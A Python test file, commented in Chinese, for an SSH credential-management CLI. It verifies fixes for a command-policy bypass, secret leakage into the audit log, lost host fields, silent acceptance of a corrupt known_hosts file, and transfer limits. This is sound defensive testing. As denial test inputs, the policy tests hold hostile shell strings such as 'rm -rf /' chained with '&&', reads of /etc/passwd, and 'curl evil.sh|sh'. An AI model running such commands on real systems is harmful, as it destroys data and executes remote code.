"""P0 还真债：外部评审给出的绕过用例与真值修复。

本文件按 issue 分段，每条都对应 docs/DESIGN.md §5 里 P0 的一行：

  #28 策略语义：re.search → re.fullmatch，shell 元字符默认拒绝
  #29 vault.open 审计不再落 argv 里的秘密；--stdin 取值改为 --stdin / --stdin-file
  #30 setpass 不再丢 sudo / key_file / description
  #31 known_hosts 损坏不再静默降级成「谁都信」
  #32 put / get 的本地路径、大小与超时约束

运行：
    ~/.sshhh/venv/Scripts/python.exe tests/test_p0.py
"""

from __future__ import annotations

import io
import json
import os
import shutil
import sys
import tempfile
import time
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(SCRIPTS))

_TMP = Path(tempfile.mkdtemp(prefix="sshhh-p0-"))
os.environ["SSHHH_DATA_DIR"] = str(_TMP)
os.environ.pop("SSHHH_MASTER", None)

from lib import paths, store  # noqa: E402

PASSED = 0
FAILED = 0


def check(name: str, cond: bool, detail: str = "") -> None:
    global PASSED, FAILED
    if cond:
        PASSED += 1
        print(f"  [ok] {name}")
    else:
        FAILED += 1
        print(f"  [FAIL] {name}" + (f"  -> {detail}" if detail else ""))


def reset() -> None:
    shutil.rmtree(_TMP, ignore_errors=True)
    _TMP.mkdir(parents=True, exist_ok=True)


def denied(policy: store.Policy, command: str, **kw) -> str | None:
    return policy.check(command, **kw)


# --------------------------------------------------------------------------
# #28 策略语义
# --------------------------------------------------------------------------


def test_policy_bypass_cases() -> None:
    """评审给出的四条绕过用例，全部必须转红。"""

    print("\n== #28 deny 被 && / ; 绕过 ==")
    p = store.Policy(deny=[r"^rm -rf"])
    r = denied(p, "df -h && rm -rf /")
    check("df -h && rm -rf / 被拒", r is not None, str(r))
    r = denied(p, "cd /tmp; rm -rf /")
    check("cd /tmp; rm -rf / 被拒", r is not None, str(r))
    r = denied(p, "df -h\nrm -rf /")
    check("换行拼接被拒", r is not None, str(r))
    r = denied(p, "df -h | tee /tmp/x")
    check("管道被拒", r is not None, str(r))
    r = denied(p, "$(rm -rf /)")
    check("命令替换被拒", r is not None, str(r))
    r = denied(p, "`rm -rf /`")
    check("反引号被拒", r is not None, str(r))
    r = denied(p, "cat /etc/passwd > /tmp/x")
    check("重定向被拒", r is not None, str(r))
    r = denied(p, "cat < /etc/passwd")
    check("输入重定向被拒", r is not None, str(r))

    print("\n== #28 allow 未锚定被 ; 绕过 ==")
    p = store.Policy(allow=["df -h"])
    check("df -h 本身放行", denied(p, "df -h") is None, str(denied(p, "df -h")))
    r = denied(p, "x; rm -rf /; df -h")
    check("x; rm -rf /; df -h 被拒", r is not None, str(r))
    r = denied(p, "df -h extra")
    check("fullmatch 不放过额外参数", r is not None, str(r))

    p = store.Policy(allow=[r"^systemctl status "])
    r = denied(p, "systemctl status x; curl evil.sh|sh")
    check("README 旧示例的绕过写法被拒", r is not None, str(r))

    print("\n== #28 fullmatch 语义 ==")
    p = store.Policy(deny=[r"^rm -rf.*"])
    check("deny 覆盖整族命令", denied(p, "rm -rf /") is not None)
    check("allow_shell 下 deny 仍是 fullmatch",
          denied(p, "cd /tmp; rm -rf /", allow_shell=True) is None,
          "没写 .* 的规则不该命中整串")
    p = store.Policy(allow=[r"^df -h$"])
    check("^df -h$ 放行 df -h", denied(p, "df -h") is None)
    check("^df -h$ 不放过 df -h 2>/dev/null",
          denied(p, "df -h 2>/dev/null", allow_shell=True) is not None)
    p = store.Policy(deny=["shutdown"])
    check("字面规则只匹配整串", denied(p, "shutdown") is not None
          and denied(p, "shutdown -h now") is None)

    print("\n== #28 allow_shell 放行元字符 ==")
    p = store.Policy()
    r = denied(p, "echo a && echo b", allow_shell=True)
    check("allow_shell 放行 &&", r is None, str(r))
    r = denied(p, "df -h 2>/dev/null", allow_shell=True)
    check("allow_shell 放行重定向", r is None, str(r))
    r = denied(p, "echo $HOME", allow_shell=True)
    check("allow_shell 放行 $", r is None, str(r))

    print("\n== #28 规则写坏不崩、不放开 ==")
    p = store.Policy(deny=["(unclosed"])
    try:
        r = denied(p, "ls -l")
        ok = True
    except Exception as exc:  # noqa: BLE001
        r, ok = None, False
        print(f"       异常：{exc}")
    check("非法正则不抛异常", ok)
    check("非法正则退化为字面比较", r is None, str(r))

    print("\n== #28 allow_shell 写进 hosts.toml 并读回 ==")
    reset()
    store.upsert_host(store.Host(name="shellbox", host="1.2.3.4", user="root",
                                 allow_shell=True))
    raw = paths.hosts_file().read_text(encoding="utf-8")
    check("清单里有 allow_shell = true", "allow_shell = true" in raw, raw)
    h = store.get("shellbox")
    check("读回来是 True", h is not None and h.allow_shell is True, str(h))
    store.upsert_host(store.Host(name="plain", host="5.6.7.8", user="root"))
    h2 = store.get("plain")
    check("没写就是 False", h2 is not None and h2.allow_shell is False, str(h2))


def test_audit_does_not_leak_argv() -> None:
    """vault.open 把整串 argv 落盘，等于把「随手写在命令里的秘密」也落盘。"""

    print("\n== #29 vault.open 不再落 argv 里的秘密 ==")
    reset()
    from lib import audit, vault

    master = "p0-master-passphrase-7d1"
    vault_secret = "VaultedPw!2026"
    v = vault.Vault.create(paths.vault_file(), master)
    v.set("prod", vault_secret)
    os.environ["SSHHH_MASTER"] = master

    secret = "S3cretValue123"
    saved = sys.argv[:]
    # 复刻 issue 里的实测调用：密码既在 --stdin 的值里，也在远端命令里
    sys.argv = ["sshhh.py", "run", "prod", "--stdin", secret,
                "mysql", "-u", "root", "-p" + secret]
    try:
        vault.open_vault()
    finally:
        sys.argv = saved

    text = paths.audit_file().read_text(encoding="utf-8")
    check("argv 里的临时秘密不落盘", secret not in text, text[-400:])
    check("库里已有的密码也不落盘", vault_secret not in text, text[-400:])
    check("主密码不落盘", master not in text, text[-400:])

    opens = [r for r in audit.tail(10) if r.get("action") == "vault.open"]
    last = opens[-1] if opens else {}
    command = str(last.get("command", ""))
    check("留下了 pid", f"pid={os.getpid()}" in command, command)
    check("留下了工作目录", "cwd=" in command, command)
    check("留下了可执行文件", "exe=" in command, command)
    check("只留前两个 argv 参数", "mysql" not in command, command)

    print("\n== #29 caller 字段删除 ==")
    os.environ["SSHHH_CALLER"] = "随便填的-agent"
    audit.write("test", host="h")
    os.environ.pop("SSHHH_CALLER", None)
    recs = audit.tail(10)
    check("审计记录里没有 caller", all("caller" not in r for r in recs), str(recs[-1]))
    check("自填的调用方名没被写进去",
          '"随便填的-agent"' not in paths.audit_file().read_text(encoding="utf-8"))

    print("\n== #29 --stdin 只接受 - ==")
    import sshhh as cli

    value_flags = {"timeout", "stdin", "stdin-file"}
    opts, pos = cli._parse(["hk", "--stdin", "-", "mysql"], value_flags)
    check("--stdin - 解析成值", opts.get("stdin") == "-", str(opts))
    check("命令不受影响", pos == ["hk", "mysql"], str(pos))

    opts, _ = cli._parse(["hk", "--stdin-file", "a.sql", "mysql"], value_flags)
    check("--stdin-file 解析成路径", opts.get("stdin-file") == "a.sql", str(opts))

    def usage_error(opts_dict: dict) -> str | None:
        try:
            cli._stdin_data(opts_dict)
        except cli.UsageError as exc:
            return str(exc)
        return None

    detail = usage_error({"stdin": secret})
    check("--stdin <值> 直接报错而不是默默放行", detail is not None, str(detail))
    check("错误里指出会进审计日志", detail is not None and "审计" in detail, str(detail))

    stdin_file = _TMP / "payload.sql"
    stdin_file.write_text("SELECT 1;\n", encoding="utf-8")
    check("--stdin-file 读得到内容",
          cli._stdin_data({"stdin-file": str(stdin_file)}) == "SELECT 1;\n")
    detail = usage_error({"stdin-file": str(_TMP / "missing.sql")})
    check("--stdin-file 文件不存在时报错", detail is not None, str(detail))


def test_setpass_keeps_fields() -> None:
    """setpass 复用 add_host 流程，旧实现整段重写 Host → sudo / key_file 被清空。"""

    import contextlib
    import io

    import console_setup
    from lib import vault

    print("\n== #30 setpass 不丢 sudo / key_file / description ==")
    reset()
    master = "p0-master-setpass-3c9"
    os.environ["SSHHH_MASTER"] = master
    v = vault.Vault.create(paths.vault_file(), master)
    v.set("prod", "old-password-1")
    store.upsert_host(store.Host(
        name="prod", host="10.1.2.3", user="deploy", port=2222,
        description="生产", sudo=True,
        key_file="/home/deploy/.ssh/id_ed25519", allow_shell=True,
    ))
    store.set_policy("prod", [r"^df -h$"], [r"^rm -rf.*"])

    asked: list[str] = []
    orig = (console_setup.ask, console_setup.ask_port, console_setup.ask_secret)
    # 模拟用户「一路回车」：ask 返回默认值，密码输入新的
    console_setup.ask = lambda prompt, default="", required=True: (
        asked.append(prompt), default)[1]
    console_setup.ask_port = lambda prompt, default="22": (
        asked.append(prompt), int(default))[1]
    console_setup.ask_secret = lambda prompt, confirm=False: "new-password-2"
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            console_setup.do_add_host({"host_name": "prod", "reset_password": True})
    finally:
        console_setup.ask, console_setup.ask_port, console_setup.ask_secret = orig

    h = store.get("prod")
    check("sudo 保留", h is not None and h.sudo is True, str(h))
    check("key_file 保留", h is not None and h.key_file
          == "/home/deploy/.ssh/id_ed25519", str(h))
    check("description 保留", h is not None and h.description == "生产", str(h))
    check("端口保留", h is not None and h.port == 2222, str(h))
    check("allow_shell 保留", h is not None and h.allow_shell is True, str(h))
    check("命令策略保留", h is not None and h.policy.allow == [r"^df -h$"], str(h))
    check("密码已更新", vault.open_vault().get("prod") == "new-password-2")
    check("reset_password 不再重问地址 / 端口",
          not any(("地址" in a) or ("端口" in a) for a in asked), str(asked))

    print("\n== #30 走完整编辑流程（config）也不丢字段 ==")
    asked.clear()
    console_setup.ask = lambda prompt, default="", required=True: (
        asked.append(prompt), default)[1]
    console_setup.ask_port = lambda prompt, default="22": (
        asked.append(prompt), int(default))[1]
    console_setup.ask_secret = lambda prompt, confirm=False: "new-password-3"
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            console_setup.do_add_host({"host_name": "prod"})
    finally:
        console_setup.ask, console_setup.ask_port, console_setup.ask_secret = orig

    h = store.get("prod")
    check("一路回车后字段仍然在", h is not None and h.sudo is True
          and h.key_file == "/home/deploy/.ssh/id_ed25519"
          and h.description == "生产" and h.port == 2222, str(h))
    check("地址没被清空", h is not None and h.host == "10.1.2.3", str(h))
    check("这次确实问了地址和端口",
          any("地址" in a for a in asked) and any("端口" in a for a in asked),
          str(asked))

    print("\n== #30 新主机仍按输入创建 ==")
    answers = {"名称": "fresh", "地址": "9.9.9.9", "用户名": "root",
               "备注（可留空）": "新机器"}
    console_setup.ask = lambda prompt, default="", required=True: (
        answers.get(prompt, default))
    console_setup.ask_port = lambda prompt, default="22": 2200
    console_setup.ask_secret = lambda prompt, confirm=False: "fresh-password"
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            console_setup.do_add_host({})
    finally:
        console_setup.ask, console_setup.ask_port, console_setup.ask_secret = orig

    fresh = store.get("fresh")
    check("新主机创建成功", fresh is not None, str(fresh))
    check("字段按输入落盘",
          fresh is not None and fresh.host == "9.9.9.9"
          and fresh.user == "root" and fresh.port == 2200
          and fresh.description == "新机器", str(fresh))
    check("新主机不会被凭空加上 sudo / 密钥",
          fresh is not None and fresh.sudo is False and fresh.key_file is None,
          str(fresh))
    check("新主机密码入 vault",
          vault.open_vault().get("fresh") == "fresh-password")
    os.environ.pop("SSHHH_MASTER", None)


def test_known_hosts() -> None:
    """损坏的 known_hosts 被吞掉 → 空库 → 任何主机密钥都接受。"""

    import subprocess

    import paramiko

    from lib import transport
    from lib.store import Host, Settings

    print("\n== #31 损坏的指纹库必须报错，不能静默当空库 ==")
    reset()
    known = paths.known_hosts_file()
    known.write_text("这不是指纹库 随便写的内容\n", encoding="utf-8")
    client = transport.Client(
        Host(name="bad", host="127.0.0.1", user="root", port=1),
        "pw", Settings(),
    )
    err: str | None = None
    try:
        client.connect()
    except transport.TransportError as exc:
        err = str(exc)
    check("损坏的指纹库让连接中止", err is not None, str(err))
    check("提示指纹库损坏", err is not None and "指纹库损坏" in err, str(err))
    check("说明没有发出凭据",
          err is not None and ("凭据" in err or "没有向该主机发送" in err), str(err))
    check("报错发生在建连之前（不是网络错误）",
          err is not None and "网络错误" not in err, str(err))

    print("\n== #31 结构检查能认出截断的行 ==")
    good_key = paramiko.RSAKey.generate(1024)
    line = f"1.1.1.1 {good_key.get_name()} {good_key.get_base64()}"
    check("完整行通过检查", transport.check_known_hosts_text(line + "\n") is None)
    check("注释与空行通过", transport.check_known_hosts_text("# c\n\n" + line) is None)
    truncated = transport.check_known_hosts_text(line[:40] + "\n")
    check("截断行被识别", truncated is not None, str(truncated))
    short = transport.check_known_hosts_text("1.1.1.1 ssh-rsa\n")
    check("缺 base64 的行被识别", short is not None, str(short))

    print("\n== #31 只替换该主机的条目，其它行原样保留 ==")
    old_key = paramiko.RSAKey.generate(1024)
    new_key = paramiko.RSAKey.generate(1024)
    original = (
        "# 手写注释\n"
        f"1.1.1.1 {old_key.get_name()} {old_key.get_base64()}\n"
        f"2.2.2.2 {good_key.get_name()} {good_key.get_base64()}\n"
        "\n"
        "# 尾巴\n"
    )
    merged = transport.merge_known_hosts(original, [("1.1.1.1", new_key)])
    check("注释保留", "# 手写注释" in merged and "# 尾巴" in merged, merged)
    check("其它主机保留", "2.2.2.2" in merged, merged)
    check("旧指纹已替换", old_key.get_base64() not in merged, merged)
    check("新指纹已写入", new_key.get_base64() in merged, merged)
    check("同一主机只剩一行",
          sum(1 for ln in merged.splitlines() if ln.startswith("1.1.1.1 ")) == 1,
          merged)
    check("合并结果结构合法", transport.check_known_hosts_text(merged) is None, merged)

    print("\n== #31 并发写下不会写坏指纹库 ==")
    known.unlink(missing_ok=True)
    worker = r"""
import sys, paramiko
sys.path.insert(0, sys.argv[1])
from lib import transport
key = paramiko.RSAKey.generate(1024)
print("OK" if transport.remember_host_keys([(sys.argv[2], key)]) else "FAIL")
"""
    hosts = [f"10.9.0.{i}" for i in range(6)]
    procs = [
        subprocess.Popen([sys.executable, "-c", worker, str(SCRIPTS), h],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         text=True, encoding="utf-8")
        for h in hosts
    ]
    results = [p.communicate(timeout=120)[0].strip() for p in procs]
    check("六个并发写入都成功", results == ["OK"] * len(hosts), str(results))

    text = known.read_text(encoding="utf-8")
    check("文件没被写坏（结构检查通过）",
          transport.check_known_hosts_text(text) is None, text)
    missing = [h for h in hosts if not any(
        ln.startswith(h + " ") for ln in text.splitlines())]
    check("六条指纹一条都没丢", not missing, f"缺失 {missing}\n{text}")

    keys = paramiko.HostKeys()
    keys.load(str(known))
    check("paramiko 能完整载入", len(keys) == len(hosts), str(list(keys)))
    check("载入后不再触发 missing_host_key",
          all(h in keys for h in hosts), str(list(keys)))


class _FakeRemoteFile:
    """最小可用的 SFTP 文件对象：够 transport 的分块读写用。"""

    def __init__(self, buffer, writer=None):
        self._buf = buffer
        self._writer = writer

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def read(self, size=-1):
        return self._buf.read(size)

    def write(self, data):
        if self._writer is not None:
            self._writer.append(data)
        return len(data)

    def close(self):
        pass


class _FakeSftp:
    def __init__(self, data: bytes = b"", stat_size: int | None = None):
        self.data = data
        self.stat_size = len(data) if stat_size is None else stat_size
        self.written: list[bytes] = []
        self.removed: list[str] = []

    def stat(self, remote):
        import types

        return types.SimpleNamespace(st_size=self.stat_size)

    def open(self, path, mode):
        if "r" in mode:
            return _FakeRemoteFile(io.BytesIO(self.data))
        return _FakeRemoteFile(io.BytesIO(), self.written)

    def get_channel(self):
        return None

    def remove(self, remote):
        self.removed.append(remote)

    def close(self):
        pass


class _FakeSsh:
    def __init__(self, sftp: _FakeSftp):
        self._sftp = sftp

    def open_sftp(self) -> _FakeSftp:
        return self._sftp

    def close(self):
        pass


def test_transfer_limits() -> None:
    """put/get 两端都要有大小与超时上限，超限要报错而不是挂死。"""

    from lib import transport
    from lib.store import Host, Settings

    def attach(client, sftp):
        """换掉底层连接（Client 会缓存 SFTP 客户端，一起重置）。"""
        client._ssh = _FakeSsh(sftp)  # noqa: SLF001
        client._sftp = None  # noqa: SLF001

    print("\n== #32 get 的大小上限 ==")
    reset()
    host = Host(name="box", host="127.0.0.1", user="root")
    client = transport.Client(host, "pw", Settings(transfer_max_bytes=1024))
    attach(client, _FakeSftp(b"x" * 4096))

    target = _TMP / "big.bin"
    err = None
    try:
        client.get_file("/remote/big.bin", str(target))
    except transport.TransportError as exc:
        err = str(exc)
    check("超过上限直接拒绝", err is not None and "上限" in err, str(err))
    check("提示怎么放宽", err is not None and "--max-bytes" in err, str(err))
    check("没有留下半截文件", not target.exists(), str(target))

    print("\n== #32 传输中途超限也不留半截文件 ==")
    attach(client, _FakeSftp(b"y" * 4096, stat_size=10))  # stat 撒谎：实际更大
    target2 = _TMP / "sneaky.bin"
    err = None
    try:
        client.get_file("/remote/sneaky.bin", str(target2))
    except transport.TransportError as exc:
        err = str(exc)
    check("边传边算大小，超了立刻中止",
          err is not None and "上限" in err, str(err))
    check("半截文件被删掉", not target2.exists(), str(target2))

    print("\n== #32 get 正常路径 ==")
    payload = b"hello world\n" * 10
    attach(client, _FakeSftp(payload))
    ok_target = _TMP / "ok.bin"
    written = client.get_file("/remote/ok.bin", str(ok_target), max_bytes=0)
    check("返回写入字节数", written == len(payload), str(written))
    check("内容落盘", ok_target.read_bytes() == payload)

    print("\n== #32 put 的大小上限 ==")
    big = _TMP / "big-upload.bin"
    big.write_bytes(b"z" * 4096)
    attach(client, _FakeSftp())
    err = None
    try:
        client.put_file(str(big), "/tmp/big-upload.bin")
    except transport.TransportError as exc:
        err = str(exc)
    check("超过上限直接拒绝", err is not None and "上限" in err, str(err))

    small = _TMP / "small.bin"
    small.write_bytes(b"ping\n")
    fake3 = _FakeSftp()
    attach(client, fake3)
    sent = client.put_file(str(small), "/tmp/small.txt")
    check("正常上传返回字节数", sent == small.stat().st_size, str(sent))
    check("内容真的发出去了", b"".join(fake3.written) == b"ping\n",
          str(fake3.written))

    print("\n== #32 超时与 sftp() 封装 ==")
    err = None
    try:
        transport._check_deadline(time.monotonic() - 1, "下载", "/x")
    except transport.TransportError as exc:
        err = str(exc)
    check("超时判定会抛 TransportError", err is not None and "超时" in err, str(err))

    fake4 = _FakeSftp()
    attach(client, fake4)
    check("Client.sftp() 返回 SFTP 客户端", client.sftp() is fake4)
    check("Client.sftp() 复用同一个连接", client.sftp() is fake4)

    import inspect

    src = inspect.getsource(__import__("sshhh")._transfer)
    check("CLI 不再摸 client._ssh", "_ssh" not in src, src[:200])
    check("CLI 走 Client.sftp/put_file/get_file",
          "put_file" in src and "get_file" in src)


def main() -> int:
    test_policy_bypass_cases()
    test_audit_does_not_leak_argv()
    test_setpass_keeps_fields()
    test_known_hosts()
    test_transfer_limits()

    shutil.rmtree(_TMP, ignore_errors=True)
    print("\n" + "=" * 46)
    print(f"通过 {PASSED} 项，失败 {FAILED} 项")
    return 0 if FAILED == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
